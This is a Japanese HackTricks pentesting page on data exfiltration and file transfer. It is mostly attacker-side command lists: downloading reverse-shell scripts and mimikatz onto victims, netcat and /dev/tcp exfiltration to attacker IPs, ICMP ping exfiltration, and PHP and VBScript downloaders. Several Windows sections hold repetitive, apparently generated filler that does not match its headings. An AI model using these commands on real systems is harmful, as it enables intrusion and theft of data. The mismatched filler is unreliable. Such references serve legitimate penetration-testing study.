# 情報の外部流出

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象を追跡し、積極的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 情報を外部流出するための一般的にホワイトリストに登録されているドメイン

[https://lots-project.com/](https://lots-project.com/)をチェックして、悪用できる一般的にホワイトリストに登録されているドメインを見つけてください。

## Base64のコピー＆ペースト

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**

Windowsは、多くの組織で使用されている最も一般的なオペレーティングシステムの1つです。そのため、Windows環境での情報の盗み出しは、ハッカーにとって非常に魅力的なターゲットです。

Windows環境での情報の盗み出しには、さまざまな手法があります。以下にいくつかの一般的な手法を示します。

1. **ファイル転送プロトコル（FTP）**：FTPは、ファイルをネットワーク上で転送するためのプロトコルです。ハッカーは、FTPを使用してWindowsマシンからデータを盗み出すことができます。

2. **リモートデスクトッププロトコル（RDP）**：RDPは、リモートでWindowsマシンにアクセスするためのプロトコルです。ハッカーは、RDPを使用してWindowsマシンに侵入し、データを盗み出すことができます。

3. **ウェブブラウザの脆弱性**：Windowsのウェブブラウザには、様々な脆弱性が存在します。ハッカーは、これらの脆弱性を悪用して、ユーザーの情報を盗み出すことができます。

4. **メールのフィッシング攻撃**：ハッカーは、偽のメールを送信して、ユーザーの情報を盗み出すことがあります。これは、添付ファイルやリンクを含むメールを送信することで行われます。

5. **USBデバイスの悪用**：ハッカーは、感染したUSBデバイスを使用してWindowsマシンに侵入し、データを盗み出すことができます。

これらは、Windows環境での情報の盗み出しに使用される一般的な手法の一部です。ハッカーは、これらの手法を使用して、機密情報や個人情報を盗み出すことができます。組織は、これらの手法に対するセキュリティ対策を講じることが重要です。
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**

Windowsは、多くの組織で使用されている最も一般的なオペレーティングシステムの1つです。そのため、Windows環境での情報の盗み出しは、ハッカーにとって非常に魅力的なターゲットです。

Windows環境での情報の盗み出しには、さまざまな手法があります。以下にいくつかの一般的な手法を示します。

1. **ファイル転送プロトコル（FTP）**：FTPは、ファイルをネットワーク上で転送するためのプロトコルです。ハッカーは、FTPサーバーに接続して、機密情報をダウンロードすることができます。

2. **リモートデスクトッププロトコル（RDP）**：RDPは、リモートでWindowsマシンにアクセスするためのプロトコルです。ハッカーは、RDPを使用してターゲットマシンにアクセスし、情報を盗み出すことができます。

3. **メール**：ハッカーは、悪意のあるメールを送信して、ターゲットのユーザーに機密情報を提供するように誘導することがあります。これは、フィッシング攻撃の一形態です。

4. **ウェブブラウザ**：ハッカーは、ウェブブラウザを介してターゲットのマシンにアクセスし、情報を盗み出すことができます。これには、悪意のあるウェブサイトやブラウザの脆弱性を利用する方法があります。

5. **USBデバイス**：ハッカーは、悪意のあるUSBデバイスを使用して、ターゲットマシンにアクセスし、情報を盗み出すことができます。これは、ソーシャルエンジニアリングの一形態です。

これらは一部の一般的なWindows環境での情報の盗み出し手法です。ハッカーは、これらの手法を組み合わせたり、他の手法を使用したりすることもあります。セキュリティ意識の高い組織は、これらの手法に対する防御策を実施することが重要です。
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### ファイルのアップロード

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Pythonモジュール [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPSサーバー**

An HTTPS server is a type of server that uses the HTTPS (Hypertext Transfer Protocol Secure) protocol to secure the communication between the server and the client. It provides encryption and authentication mechanisms to ensure that the data transmitted between the server and the client is secure and cannot be intercepted or tampered with by unauthorized parties.

HTTPS servers are commonly used for websites that handle sensitive information, such as login credentials, financial transactions, and personal data. By using HTTPS, the server can protect the confidentiality and integrity of the data being transmitted.

To set up an HTTPS server, you need to obtain an SSL/TLS certificate from a trusted certificate authority (CA). This certificate is used to verify the identity of the server and establish a secure connection with the client. Once the certificate is installed on the server, it can start accepting HTTPS connections.

When a client connects to an HTTPS server, the server presents its SSL/TLS certificate to the client. The client then verifies the authenticity of the certificate and establishes a secure connection with the server. All data transmitted between the client and the server is encrypted using the SSL/TLS protocol, ensuring that it cannot be read or modified by attackers.

In addition to encryption, HTTPS servers also provide other security features, such as server-side authentication and client-side authentication. Server-side authentication ensures that the client is connecting to the intended server, while client-side authentication verifies the identity of the client.

Overall, HTTPS servers play a crucial role in securing the communication between clients and servers, protecting sensitive data from unauthorized access or modification. By using HTTPS, organizations can ensure the privacy and integrity of their online services and build trust with their users.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTPサーバー（Python）

```python
import ftplib

def ftp_upload(file_path, host, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        with open(file_path, 'rb') as file:
            ftp.storbinary('STOR ' + file_path, file)
        ftp.quit()
        print('File uploaded successfully.')
    except ftplib.all_errors as e:
        print('Error uploading file:', e)
```

このPythonスクリプトは、指定されたファイルをFTPサーバーにアップロードするためのものです。

使用方法：

```python
ftp_upload('/path/to/file', 'ftp.example.com', 'username', 'password')
```

- `file_path`：アップロードするファイルのパス
- `host`：FTPサーバーのホスト名
- `username`：FTPサーバーのユーザー名
- `password`：FTPサーバーのパスワード

アップロードが成功すると、"File uploaded successfully."と表示されます。アップロード中にエラーが発生した場合は、"Error uploading file:"とエラーメッセージが表示されます。
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTPサーバー（NodeJS）

FTPサーバーは、ファイル転送プロトコル（FTP）を使用してファイルを送受信するためのサーバーアプリケーションです。NodeJSを使用してFTPサーバーを構築する方法について説明します。

#### インストール

まず、NodeJSをインストールします。NodeJSの公式ウェブサイトから最新バージョンをダウンロードしてインストールします。

#### パッケージのインストール

次に、`ftp-srv`というNodeJSパッケージをインストールします。以下のコマンドを使用してインストールします。

```bash
npm install ftp-srv
```

#### サンプルコード

以下のサンプルコードは、FTPサーバーを作成するための基本的なスクリプトです。

```javascript
const FtpSrv = require('ftp-srv');

const ftpServer = new FtpSrv({
  url: 'ftp://localhost:21',
  pasv_url: 'ftp://localhost:3000',
  pasv_min: 3001,
  pasv_max: 3009,
  anonymous: true,
  greeting: 'Welcome to the FTP server!'
});

ftpServer.on('login', ({connection, username, password}, resolve, reject) => {
  if (username === 'anonymous' && password === '') {
    resolve({root: '/path/to/ftp/root'});
  } else {
    reject(new Error('Invalid username or password'));
  }
});

ftpServer.listen()
  .then(() => {
    console.log('FTP server started');
  })
  .catch((error) => {
    console.error('Error starting FTP server:', error);
  });
```

#### 起動

上記のスクリプトを`server.js`という名前で保存し、以下のコマンドを使用してFTPサーバーを起動します。

```bash
node server.js
```

#### 接続

FTPクライアントを使用して、FTPサーバーに接続します。ホスト名に`localhost`、ポート番号に`21`を指定します。匿名ログインを使用する場合、ユーザー名に`anonymous`、パスワードに空文字列を入力します。

以上が、NodeJSを使用してFTPサーバーを構築する方法です。FTPサーバーを使用することで、ファイルの転送や共有を簡単に行うことができます。
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTPサーバー（pure-ftp）

FTPサーバーは、ファイル転送プロトコル（FTP）を使用してファイルを送受信するためのサーバーです。pure-ftpは、オープンソースのFTPサーバーソフトウェアの一種です。

#### 概要

pure-ftpサーバーは、セキュリティとパフォーマンスに優れた特徴を持っています。以下は、pure-ftpサーバーの主な特徴です。

- TLS/SSLサポート：データの暗号化とセキュアな通信を提供します。
- 仮想ユーザー：ユーザーを仮想的に作成し、アクセス権を制御します。
- アクセス制御：ユーザーごとにアクセス権を設定し、ファイルの読み取り、書き込み、実行の制限を行います。
- バンド幅制限：ユーザーごとに帯域幅の制限を設定し、ネットワークの負荷を制御します。
- ログ記録：アクセスログや転送ログを記録し、セキュリティ監視やトラブルシューティングに役立ちます。

#### 漏洩のリスク

pure-ftpサーバーは、ファイルの転送を行うため、機密情報が漏洩するリスクがあります。以下は、漏洩のリスクの例です。

- パスワードの漏洩：不正なアクセスにより、ユーザーのパスワードが盗まれる可能性があります。
- ファイルの漏洩：不正なアクセスにより、機密ファイルがダウンロードされる可能性があります。

#### 漏洩の防止策

pure-ftpサーバーの漏洩リスクを最小限に抑えるために、以下の対策を実施することが重要です。

- 強力なパスワードポリシーの適用：ユーザーには強力なパスワードの使用を促し、定期的なパスワード変更を求めます。
- TLS/SSLの使用：データの暗号化とセキュアな通信を提供するために、TLS/SSLを有効にします。
- アクセス制御の設定：ユーザーごとに適切なアクセス権を設定し、必要な権限のみを与えます。
- ログの監視：アクセスログや転送ログを監視し、不正なアクティビティを検知します。

以上が、pure-ftpサーバーの概要、漏洩のリスク、および漏洩の防止策です。これらの情報を理解し、適切なセキュリティ対策を実施することが重要です。
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** クライアント

Windowsクライアントは、機密データの外部への漏洩のリスクにさらされています。攻撃者は、さまざまな手法を使用してデータを盗み出すことができます。以下に、一般的な手法とリソースを示します。

#### ネットワーク経由のデータ漏洩

- **データエクスフィルトレーション**：攻撃者は、ネットワークを介してデータを外部に送信することができます。これには、メール、ファイル転送、リモートコマンド実行などの手法があります。

#### ストレージデバイスを介したデータ漏洩

- **USBデバイス**：攻撃者は、USBデバイスを使用してデータを盗み出すことができます。これには、USBフラッシュドライブ、外部ハードドライブ、およびその他のリムーバブルメディアが含まれます。

#### クラウドベースのデータ漏洩

- **クラウドストレージ**：攻撃者は、クラウドストレージサービスを使用してデータを外部に送信することができます。これには、Googleドライブ、Dropbox、OneDriveなどが含まれます。

#### ネットワークトラフィックの監視

- **パケットキャプチャ**：攻撃者は、ネットワークトラフィックを監視してデータをキャプチャすることができます。これには、ネットワークスニッファ、パケットキャプチャツールなどが含まれます。

#### セキュリティ対策の回避

- **ファイアウォール回避**：攻撃者は、ファイアウォールを回避してデータを外部に送信することができます。これには、トンネリング、ポートホッピング、プロキシサーバの使用などが含まれます。

これらの攻撃手法に対抗するためには、適切なセキュリティ対策を実施する必要があります。これには、ファイアウォール、侵入検知システム、データ暗号化、アクセス制御などが含まれます。また、従業員の教育やセキュリティポリシーの策定も重要です。
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリまで、クラウドシステムを含むテックスタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kaliをサーバーとして使用
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
または、Sambaを使用してSMB共有を作成します：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# データの外部流出

データの外部流出は、ハッカーが機密情報を不正に取得し、外部の場所に送信するプロセスです。この技術は、悪意のある攻撃者が組織のデータを盗むために使用することがあります。以下に、Windows環境での一般的なデータの外部流出方法をいくつか紹介します。

## リムーバブルメディア

ハッカーは、USBフラッシュドライブや外部ハードドライブなどのリムーバブルメディアを使用してデータを外部に持ち出すことがあります。これにより、ハッカーは物理的にアクセスできる場所にデータを持ち出すことができます。

## クラウドストレージ

クラウドストレージサービス（例：Dropbox、Google Drive）は、ハッカーがデータを外部に送信するための便利な手段です。ハッカーは、クラウドストレージアカウントにアクセスし、データをアップロードすることができます。

## メール

ハッカーは、電子メールを使用してデータを外部に送信することがあります。ハッカーは、悪意のある添付ファイルやリンクを含むメールを送信し、受信者がそれらを開くことでデータが外部に送信されるようにします。

## ネットワーク経由の転送

ハッカーは、ネットワークを介してデータを外部に送信することができます。これには、リモートサーバーへのデータのアップロードや、データを暗号化して外部の場所に送信する方法が含まれます。

これらは一般的なデータの外部流出方法の一部ですが、ハッカーは常に新しい方法を開発しています。組織は、これらの攻撃からデータを保護するために、適切なセキュリティ対策を講じる必要があります。
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

攻撃者はSSHdを実行している必要があります。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

もし被害者がSSHを持っている場合、攻撃者は被害者から自分自身にディレクトリをマウントすることができます。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC（Netcat）は、ネットワーク通信を行うためのユーティリティツールです。NCを使用すると、TCPやUDPソケットを作成し、データの送受信を行うことができます。

### ファイルの転送

NCを使用してファイルを転送する方法はいくつかあります。

#### ファイルの送信

NCを使用してファイルを送信するには、送信元のマシンで次のコマンドを実行します。

```
nc <送信先IPアドレス> <ポート番号> < <送信するファイル>
```

このコマンドは、指定したIPアドレスとポート番号にデータを送信します。送信するファイルは、リダイレクト演算子（`<`）を使用して指定します。

#### ファイルの受信

NCを使用してファイルを受信するには、受信先のマシンで次のコマンドを実行します。

```
nc -l -p <ポート番号> > <保存先ファイル>
```

このコマンドは、指定したポート番号で待ち受け状態になり、データを受信します。受信したデータは、リダイレクト演算子（`>`）を使用して指定したファイルに保存されます。

### ステルス通信

NCを使用してステルス通信を行うこともできます。ステルス通信は、通信内容を隠蔽するために暗号化やトンネリングを行う方法です。

#### 暗号化通信

NCを使用して暗号化通信を行うには、OpenSSLを使用します。以下のコマンドを使用して、送信元と受信先のマシンで暗号化通信を設定します。

送信元マシン：

```
openssl enc -aes-256-cbc -pass pass:<パスワード> | nc <送信先IPアドレス> <ポート番号>
```

受信先マシン：

```
nc -l -p <ポート番号> | openssl enc -d -aes-256-cbc -pass pass:<パスワード> > <保存先ファイル>
```

このコマンドは、AES-256-CBC暗号を使用してデータを暗号化し、送信元から送信先にデータを送信します。受信先では、受信したデータを復号化し、指定したファイルに保存します。

#### トンネリング

NCを使用してトンネリングを行うには、SSHを使用します。以下のコマンドを使用して、送信元と受信先のマシンでトンネリングを設定します。

送信元マシン：

```
nc -l -p <ポート番号> | ssh <受信先ユーザ名>@<受信先IPアドレス> nc <受信先IPアドレス> <受信先ポート番号>
```

受信先マシン：

```
ssh <送信元ユーザ名>@<送信元IPアドレス> nc <送信元IPアドレス> <送信元ポート番号> | nc -l -p <ポート番号>
```

このコマンドは、送信元と受信先のマシンをSSHトンネルで接続し、データを送受信します。
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
```bash
cat /path/to/file > /dev/tcp/<attacker_ip>/<attacker_port>
```

この方法では、攻撃者は `/dev/tcp/<attacker_ip>/<attacker_port>` にファイルをダウンロードします。
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### ファイルを被害者にアップロードする

攻撃者が被害者のシステムにファイルをアップロードすることは、情報の抽出や悪意のある目的のために重要な手法です。以下に、ファイルを被害者にアップロードするための一般的な手法とリソースを示します。

1. ファイル共有サービスの悪用: 被害者が利用しているファイル共有サービス（Dropbox、Google ドライブなど）の脆弱性を悪用して、攻撃者がファイルをアップロードすることができます。これには、脆弱性のあるアップロード機能や認証の欠陥を利用する方法があります。

2. ウェブアプリケーションの脆弱性: 被害者が利用しているウェブアプリケーションに存在する脆弱性を悪用して、攻撃者がファイルをアップロードすることができます。例えば、ファイルアップロード機能における不正なファイルタイプの許可や、ファイルのアップロード先のディレクトリの制限が不十分な場合などです。

3. メールの添付ファイル: 攻撃者は、被害者に対して悪意のあるメールを送信し、そのメールに添付されたファイルをアップロードさせることができます。これには、ソーシャルエンジニアリングやフィッシング攻撃などの手法が使用されることがあります。

4. リモートコード実行: 攻撃者は、被害者のシステムにリモートコード実行の脆弱性が存在する場合、その脆弱性を悪用してファイルをアップロードすることができます。これには、ウェブアプリケーションやサーバーの脆弱性を利用する方法があります。

攻撃者がファイルを被害者にアップロードするためには、慎重な計画とテストが必要です。攻撃者は、検出を回避するために暗号化やステガノグラフィーなどの技術を使用することもあります。
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

ICMP（Internet Control Message Protocol）は、ネットワークデバイス間で制御メッセージを送受信するためのプロトコルです。ICMPは、ネットワークの状態やエラーの通知、ネットワークデバイスの可用性の確認など、さまざまな目的で使用されます。

ICMPは、データグラムの形式で送信され、IPヘッダの一部として含まれます。ICMPメッセージは、送信元から宛先までの経路上のネットワークデバイスによって処理されます。

ICMPメッセージは、さまざまなタイプとコードで識別されます。一般的なICMPメッセージには、エコーリクエスト（ping）やエコーリプライ（ping応答）などがあります。

ICMPは、ネットワークのトラブルシューティングやネットワークデバイスの可用性の確認に役立ちます。また、ICMPを利用して情報をエクスフィルトすることも可能です。

ICMPエクスフィルトは、ネットワーク上のデータをICMPメッセージに埋め込んで送信する方法です。この方法を使用すると、ネットワークのファイアウォールやセキュリティシステムを回避してデータを外部に送信することができます。

ICMPエクスフィルトは、データの転送速度が低いため、大量のデータを送信する場合には適していません。しかし、小さなデータセットやコマンドの実行結果など、比較的小さなデータを送信する場合には有用です。

ICMPエクスフィルトを実行するためには、ICMPパケットを生成し、データをパケットに埋め込む必要があります。また、送信元と宛先のIPアドレスを指定する必要があります。

ICMPエクスフィルトは、ネットワークの可用性やセキュリティに影響を与える可能性があるため、適切な許可を得て実行する必要があります。また、ICMPエクスフィルトを検知するためのセキュリティ対策も必要です。
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

SMTPサーバーにデータを送信できれば、Pythonを使用してデータを受信するSMTPを作成できます。
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

デフォルトではXPと2003（他の場合はインストール時に明示的に追加する必要があります）

Kaliでは、**TFTPサーバーを起動**します：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**PythonでのTFTPサーバー：**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('0.0.0.0', 69))

    while True:
        # Receive the request packet
        data, client_address = server_socket.recvfrom(516)
        opcode = struct.unpack('!H', data[:2])[0]

        # Check if it is a read request (RRQ)
        if opcode == 1:
            # Extract the filename from the request packet
            filename = data[2:data.index(b'\x00')].decode('utf-8')

            # Open the file in binary mode
            try:
                file = open(filename, 'rb')
                block_number = 1
                block_data = file.read(512)

                while block_data:
                    # Create the data packet
                    data_packet = struct.pack('!HH', 3, block_number) + block_data

                    # Send the data packet to the client
                    server_socket.sendto(data_packet, client_address)

                    # Receive the ACK packet
                    ack_packet, client_address = server_socket.recvfrom(4)
                    ack_opcode = struct.unpack('!H', ack_packet[:2])[0]
                    ack_block_number = struct.unpack('!H', ack_packet[2:])[0]

                    # Check if the ACK packet is valid
                    if ack_opcode != 4 or ack_block_number != block_number:
                        break

                    # Read the next block of data
                    block_number += 1
                    block_data = file.read(512)

                # Close the file
                file.close()

            except FileNotFoundError:
                # Send an error packet if the file is not found
                error_packet = struct.pack('!HH', 5, 1) + b'File not found'
                server_socket.sendto(error_packet, client_address)

        # Check if it is a write request (WRQ)
        elif opcode == 2:
            # Send an error packet indicating that write requests are not supported
            error_packet = struct.pack('!HH', 5, 4) + b'Write requests are not supported'
            server_socket.sendto(error_packet, client_address)

    # Close the server socket
    server_socket.close()

# Start the TFTP server
tftp_server()
```

このコードはPythonでTFTPサーバーを作成するものです。以下の手順で動作します。

1. UDPソケットを作成します。
2. ソケットをIPアドレス`0.0.0.0`とポート番号`69`にバインドします。
3. リクエストパケットを受信します。
4. 受信したパケットのオペコードを確認し、読み取りリクエスト（RRQ）か書き込みリクエスト（WRQ）かを判別します。
5. RRQの場合、リクエストパケットからファイル名を抽出します。
6. バイナリモードでファイルを開きます。
7. ファイルから512バイトのデータを読み取り、データパケットを作成してクライアントに送信します。
8. ACKパケットを受信し、ACKパケットが正当かどうかを確認します。
9. 次のデータブロックを読み取り、手順7-8を繰り返します。
10. ファイルの終わりに達した場合、ファイルを閉じます。
11. ファイルが見つからない場合、エラーパケットを送信します。
12. WRQの場合、書き込みリクエストはサポートされていないことを示すエラーパケットを送信します。
13. サーバーソケットを閉じます。

TFTPサーバーは、ファイルの読み取り要求に応答するためのものであり、書き込み要求には対応していません。
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
**被害者**で、Kaliサーバーに接続します：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

PHPのワンライナーを使用してファイルをダウンロードします：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript（Visual Basic Scripting Edition）は、Microsoftが開発したスクリプト言語です。VBScriptは、Windows環境で広く使用されており、システム管理や自動化のためのスクリプト作成に適しています。

VBScriptを使用してデータを外部に送信する方法はいくつかあります。以下にいくつかの一般的な方法を示します。

### ファイル転送

VBScriptを使用してファイルを外部に転送するには、`FileSystemObject`オブジェクトを使用します。このオブジェクトを使用すると、ファイルの読み取りや書き込み、ファイルのコピーなどの操作が可能です。外部のサーバーにファイルをアップロードする場合は、FTPプロトコルを使用することが一般的です。

以下は、VBScriptを使用してファイルをFTPサーバーにアップロードする例です。

```vbscript
Set objFTP = CreateObject("WinSCP.Session")
objFTP.Open "ftp://username:password@ftp.example.com"
objFTP.PutFile "C:\path\to\file.txt", "/remote/path/file.txt"
objFTP.Close
```

### ネットワーク経由のデータ送信

VBScriptを使用してネットワーク経由でデータを送信するには、`WinHttp.WinHttpRequest`オブジェクトを使用します。このオブジェクトを使用すると、HTTPリクエストを送信し、データを外部のサーバーに送信することができます。

以下は、VBScriptを使用してデータを外部のサーバーに送信する例です。

```vbscript
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "POST", "http://example.com/endpoint", False
objHTTP.setRequestHeader "Content-Type", "application/json"
objHTTP.Send "{""data"": ""example data""}"
```

### 電子メール経由のデータ送信

VBScriptを使用して電子メール経由でデータを送信するには、`CDO.Message`オブジェクトを使用します。このオブジェクトを使用すると、SMTPサーバーを介して電子メールを送信することができます。

以下は、VBScriptを使用して電子メールを送信する例です。

```vbscript
Set objEmail = CreateObject("CDO.Message")
objEmail.From = "sender@example.com"
objEmail.To = "recipient@example.com"
objEmail.Subject = "Example Subject"
objEmail.TextBody = "Example Body"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.example.com"
objEmail.Configuration.Fields.Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objEmail.Configuration.Fields.Update
objEmail.Send
```

これらは、VBScriptを使用してデータを外部に送信する一般的な方法のいくつかです。ただし、これらの方法を使用する場合は、セキュリティ上の注意が必要です。データの送信先や送信されるデータの内容を慎重に検討し、適切なセキュリティ対策を講じることが重要です。
```bash
Attacker> python -m SimpleHTTPServer 80
```
**被害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
